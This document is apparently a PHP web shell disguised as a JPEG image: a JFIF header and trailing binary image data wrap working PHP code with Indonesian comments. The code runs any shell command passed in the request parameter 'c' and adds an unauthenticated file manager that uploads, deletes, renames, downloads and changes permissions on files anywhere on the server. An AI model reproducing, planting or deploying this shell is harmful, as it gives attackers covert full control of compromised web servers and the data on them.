���� JFIF      ��
<?php

function executeCommand($input) {
    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w") 
    );

    $process = proc_open($input, $descriptors, $pipes);

    if (is_resource($process)) {
      
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        
        $exitCode = proc_close($process);

        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "Tidak dapat menjalankan perintah\n";
    }
}

if (isset($_REQUEST['c'])) {
    $command = $_REQUEST['c'];
    echo executeCommand($command);
}

// Fungsi untuk menghapus file
function delete_file($file) {
    if (file_exists($file)) {
        unlink($file);
        echo '<div class="alert alert-success">File berhasil dihapus: ' . $file . '</div>';
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk membuat folder
function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
    } else {
        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
    }
}

// Fungsi untuk membuat file baru
function create_file($file_name, $content) {
    if (!file_exists($file_name)) {
        file_put_contents($file_name, $content);
        echo '<div class="alert alert-success">File berhasil dibuat: ' . $file_name . '</div>';
    } else {
        echo '<div class="alert alert-warning">File sudah ada: ' . $file_name . '</div>';
    }
}

// Fungsi untuk mengedit nama file
function rename_file($file, $new_name) {
    $dir = dirname($file);
    $new_file = $dir . '/' . $new_name;
    if (file_exists($file)) {
        if (!file_exists($new_file)) {
            rename($file, $new_file);
            echo '<div class="alert alert-success">File berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">File dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk mengedit nama folder
function rename_folder($folder, $new_name) {
    $dir = dirname($folder);
    $new_folder = $dir . '/' . $new_name;
    if (file_exists($folder)) {
        if (!file_exists($new_folder)) {
            rename($folder, $new_folder);
            echo '<div class="alert alert-success">Folder berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">Folder dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">Folder tidak ditemukan: ' . $folder . '</div>';
    }
}

// Fungsi untuk mengubah izin file
function change_permissions($file, $permissions) {
    if (file_exists($file)) {
        if (chmod($file, octdec($permissions))) {
            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk mendapatkan izin file atau folder dalam format "drwxr-xr-x"
function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Tentukan direktori saat ini
$dir = $_GET['path'] ?? __DIR__;

// Logika untuk form
if (isset($_POST['submit'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
}

if (isset($_POST['create_folder'])) {
    create_folder($dir . '/' . $_POST['folder_name']);
}

if (isset($_POST['create_file'])) {
    create_file($dir . '/' . $_POST['file_name'], $_POST['file_content']);
}

if (isset($_GET['delete'])) {
    delete_file($dir . '/' . $_GET['delete']);
}

if (isset($_POST['rename_file'])) {
    rename_file($dir . '/' . $_POST['file_name'], $_POST['new_name']);
}

if (isset($_POST['rename_folder'])) {
    rename_folder($dir . '/' . $_POST['folder_name'], $_POST['new_name']);
}

if (isset($_POST['change_permissions'])) {
    change_permissions($dir . '/' . $_POST['file_name'], $_POST['permissions']);
}

if (isset($_GET['download'])) {
    $file = $dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Tampilkan file dan folder
function display_path_links($path) {
    $parts = explode('/', $path);
    $accumulated_path = '';
    foreach ($parts as $part) {
        if ($part) {
            $accumulated_path .= '/' . $part;
            echo '<a href="?path=' . urlencode($accumulated_path) . '">' . $part . '</a>/';
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager | Akmal archtte id</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #343a40;
            color: white;
        }
        .container {
            background-color: #495057;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .list-group-item-success {
            background-color: green;
            color: white;
        }
        .list-group-item-danger {
            background-color: red;
            color: white;
        }
        a {
            color: black;
        }
        a:hover {
            color: blue;
        }
        .permissions {
            font-family: monospace;
            color: green; /* Bright light blue color */
            margin-right: 10px;
            display: inline-block;
            width: 100px; /* Fixed width for alignment */
        }
        .file-item, .folder-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .file-actions, .folder-actions {
            display: flex;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-center">File Manager</h1>
        <h3>Current Path:</h3>
        <div class="mb-3">
            <?php display_path_links(realpath($dir)); ?>
        </div>

        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Upload file:</label>
                <input type="file" name="file" class="form-control" id="file">
            </div>
            <button type="submit" name="submit" class="btn btn-primary">Upload</button>
        </form>

        <form method="post">
            <div class="form-group">
                <label for="folder_name">Create new folder:</label>
                <input type="text" name="folder_name" class="form-control" id="folder_name" required>
            </div>
            <button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>
        </form>

        <form method="post">
            <div class="form-group">
                <label for="file_name">Create new file:</label>
                <input type="text" name="file_name" class="form-control" id="file_name" required>
            </div>
            <div class="form-group">
                <label for="file_content">Content:</label>
                <textarea name="file_content" class="form-control" id="file_content"></textarea>
            </div>
            <button type="submit" name="create_file" class="btn btn-success">Create File</button>
        </form>

        <hr>

        <h3>Files and Folders:</h3>
        <ul class="list-group">
            <?php
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;

                $filePath = $dir . '/' . $file;
                $permissions = get_permissions($filePath);
                if (is_dir($filePath)) {
                    echo '<li class="list-group-item folder-item">';
                    echo '<div>';
                    echo '<span class="permissions">' . $permissions . '</span>';
                    echo '<a href="?path=' . urlencode($filePath) . '">' . $file . '</a>';
                    echo '</div>';
                    echo '<div class="folder-actions">';
                    echo '<form method="post" class="form-inline ml-2">';
                    echo '<input type="hidden" name="folder_name" value="' . $file . '">';
                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
                    echo '<button type="submit" name="rename_folder" class="btn btn-warning ml-1">Rename</button>';
                    echo '</form>';
                    echo '</div>';
                    echo '</li>';
                } else {
                    echo '<li class="list-group-item file-item">';
                    echo '<div>';
                    echo '<span class="permissions">' . $permissions . '</span>';
                    echo '<a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '">' . $file . '</a>';
                    echo '</div>';
                    echo '<div class="file-actions">';
                    echo '<a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2">Delete</a>';
                    echo '<form method="post" class="form-inline ml-2">';
                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
                    echo '<button type="submit" name="rename_file" class="btn btn-warning ml-1">Rename</button>';
                    echo '</form>';
                    echo '<form method="post" class="form-inline ml-2">';
                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
                    echo '<input type="text" name="permissions" class="form-control" placeholder="Permissions" required>';
                    echo '<button type="submit" name="change_permissions" class="btn btn-info ml-1">Change Permissions</button>';
                    echo '</form>';
                    echo '</div>';
                    echo '</li>';
                }
            }
            ?>
        </ul>
    </div>
</body>
</html>









			

		


�� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) $��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�~~�t�U�Cڒ�V		I1��_��
